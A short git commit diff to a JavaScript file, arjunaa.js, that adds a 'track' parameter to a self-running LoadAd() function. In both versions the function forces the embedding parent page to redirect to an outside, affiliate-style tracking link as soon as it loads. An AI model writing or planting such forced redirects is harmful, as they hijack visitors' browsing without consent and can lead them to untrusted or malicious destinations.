db9ee6ec3d69d2a7af906588b42b0d6f9f265d12
bloggerenka <121873699+bloggerenka@users.noreply.github.com>
2026-08-21 13:32:34 +0700

    Update arjunaa.js

--- arjunaa.js
+++ arjunaa.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://dbcadbi.flowshup.com/s/ff0b14aaebc4c?sub1=Arjuna"; } LoadAd();
+function LoadAd() { parent.location.href="https://dbcadbi.flowshup.com/s/ff0b14aaebc4c?sub1=Arjuna&track=Arjuna"; } LoadAd();
